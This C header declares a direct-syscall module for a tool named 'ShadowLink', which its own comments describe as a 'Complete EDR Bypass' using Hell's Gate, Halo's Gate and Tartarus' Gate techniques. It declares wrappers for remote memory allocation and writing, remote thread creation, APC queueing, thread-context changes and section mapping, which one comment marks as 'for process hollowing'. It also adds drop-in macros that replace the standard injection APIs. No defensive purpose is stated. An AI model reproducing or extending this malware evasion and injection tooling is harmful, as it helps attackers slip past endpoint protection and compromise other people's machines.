/*
 * ShadowLink Direct Syscalls Module
 * Phase 11: Complete EDR Bypass
 * 
 * This module provides direct syscall wrappers for all sensitive APIs.
 * By calling the kernel directly, we bypass any userland hooks that
 * EDR products place in ntdll.dll.
 * 
 * Supported methods:
 * 1. Fresh ntdll parsing - Read syscall numbers from disk
 * 2. Hell's Gate - Dynamically resolve from memory
 * 3. Halo's Gate - Use neighboring syscalls when hooked
 * 4. Tartarus' Gate - Combination approach
 */

#ifndef SYSCALLS_H
#define SYSCALLS_H

#include <windows.h>

// NT Status codes
typedef LONG NTSTATUS;
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
#define STATUS_NOT_IMPLEMENTED ((NTSTATUS)0xC0000002L)

// Access masks
#define PROCESS_ALL_ACCESS_VISTA (STANDARD_RIGHTS_REQUIRED | SYNCHRONIZE | 0xFFFF)

// Memory allocation types
#define MEM_COMMIT_RESERVE (MEM_COMMIT | MEM_RESERVE)

// Syscall numbers structure
typedef struct _SYSCALL_TABLE {
    DWORD NtAllocateVirtualMemory;
    DWORD NtProtectVirtualMemory;
    DWORD NtWriteVirtualMemory;
    DWORD NtReadVirtualMemory;
    DWORD NtCreateThreadEx;
    DWORD NtOpenProcess;
    DWORD NtClose;
    DWORD NtQuerySystemInformation;
    DWORD NtQueryInformationProcess;
    DWORD NtQueueApcThread;
    DWORD NtResumeThread;
    DWORD NtSuspendThread;
    DWORD NtSetContextThread;
    DWORD NtGetContextThread;
    DWORD NtOpenThread;
    DWORD NtWaitForSingleObject;
    DWORD NtDelayExecution;
    DWORD NtFreeVirtualMemory;
    DWORD NtCreateSection;
    DWORD NtMapViewOfSection;
    DWORD NtUnmapViewOfSection;
} SYSCALL_TABLE, *PSYSCALL_TABLE;

// Global syscall table
extern SYSCALL_TABLE g_Syscalls;

// Initialization
BOOL InitializeSyscalls(void);
BOOL InitializeSyscallsFromDisk(void);
BOOL InitializeSyscallsHellsGate(void);
BOOL InitializeSyscallsHalosGate(void);

// Syscall helper (assembly stub)
extern NTSTATUS DoSyscall(DWORD syscallNumber, ...);

// ============================================
// SYSCALL WRAPPERS
// ============================================

// Memory operations
NTSTATUS SysNtAllocateVirtualMemory(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

NTSTATUS SysNtProtectVirtualMemory(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
);

NTSTATUS SysNtWriteVirtualMemory(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten
);

NTSTATUS SysNtReadVirtualMemory(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToRead,
    PSIZE_T NumberOfBytesRead
);

NTSTATUS SysNtFreeVirtualMemory(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    PSIZE_T RegionSize,
    ULONG FreeType
);

// Process operations
NTSTATUS SysNtOpenProcess(
    PHANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes,
    PVOID ClientId
);

NTSTATUS SysNtQueryInformationProcess(
    HANDLE ProcessHandle,
    DWORD ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength
);

// Thread operations
NTSTATUS SysNtCreateThreadEx(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList
);

NTSTATUS SysNtOpenThread(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes,
    PVOID ClientId
);

NTSTATUS SysNtSuspendThread(
    HANDLE ThreadHandle,
    PULONG PreviousSuspendCount
);

NTSTATUS SysNtResumeThread(
    HANDLE ThreadHandle,
    PULONG PreviousSuspendCount
);

NTSTATUS SysNtQueueApcThread(
    HANDLE ThreadHandle,
    PVOID ApcRoutine,
    PVOID ApcArgument1,
    PVOID ApcArgument2,
    PVOID ApcArgument3
);

NTSTATUS SysNtSetContextThread(
    HANDLE ThreadHandle,
    PCONTEXT ThreadContext
);

NTSTATUS SysNtGetContextThread(
    HANDLE ThreadHandle,
    PCONTEXT ThreadContext
);

// Handle operations
NTSTATUS SysNtClose(HANDLE Handle);

NTSTATUS SysNtWaitForSingleObject(
    HANDLE Handle,
    BOOLEAN Alertable,
    PLARGE_INTEGER Timeout
);

// Section operations (for process hollowing)
NTSTATUS SysNtCreateSection(
    PHANDLE SectionHandle,
    ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes,
    PLARGE_INTEGER MaximumSize,
    ULONG SectionPageProtection,
    ULONG AllocationAttributes,
    HANDLE FileHandle
);

NTSTATUS SysNtMapViewOfSection(
    HANDLE SectionHandle,
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    SIZE_T CommitSize,
    PLARGE_INTEGER SectionOffset,
    PSIZE_T ViewSize,
    DWORD InheritDisposition,
    ULONG AllocationType,
    ULONG Win32Protect
);

NTSTATUS SysNtUnmapViewOfSection(
    HANDLE ProcessHandle,
    PVOID BaseAddress
);

// System information
NTSTATUS SysNtQuerySystemInformation(
    DWORD SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

// Delay (sleep)
NTSTATUS SysNtDelayExecution(
    BOOLEAN Alertable,
    PLARGE_INTEGER DelayInterval
);

// ============================================
// HELPER MACROS FOR EASY USE
// ============================================

// Replace VirtualAllocEx with syscall version
#define SysVirtualAllocEx(hProcess, lpAddress, dwSize, flAllocationType, flProtect) \
    _SysVirtualAllocEx(hProcess, lpAddress, dwSize, flAllocationType, flProtect)

PVOID _SysVirtualAllocEx(HANDLE hProcess, PVOID lpAddress, SIZE_T dwSize, 
                         DWORD flAllocationType, DWORD flProtect);

// Replace VirtualProtectEx with syscall version
#define SysVirtualProtectEx(hProcess, lpAddress, dwSize, flNewProtect, lpflOldProtect) \
    _SysVirtualProtectEx(hProcess, lpAddress, dwSize, flNewProtect, lpflOldProtect)

BOOL _SysVirtualProtectEx(HANDLE hProcess, PVOID lpAddress, SIZE_T dwSize,
                          DWORD flNewProtect, PDWORD lpflOldProtect);

// Replace WriteProcessMemory with syscall version
#define SysWriteProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesWritten) \
    _SysWriteProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesWritten)

BOOL _SysWriteProcessMemory(HANDLE hProcess, PVOID lpBaseAddress, LPCVOID lpBuffer,
                            SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);

// Replace CreateRemoteThread with syscall version
#define SysCreateRemoteThread(hProcess, lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId) \
    _SysCreateRemoteThread(hProcess, lpStartAddress, lpParameter)

HANDLE _SysCreateRemoteThread(HANDLE hProcess, PVOID lpStartAddress, PVOID lpParameter);

// Replace OpenProcess with syscall version  
#define SysOpenProcess(dwDesiredAccess, bInheritHandle, dwProcessId) \
    _SysOpenProcess(dwDesiredAccess, dwProcessId)

HANDLE _SysOpenProcess(DWORD dwDesiredAccess, DWORD dwProcessId);

#endif // SYSCALLS_H
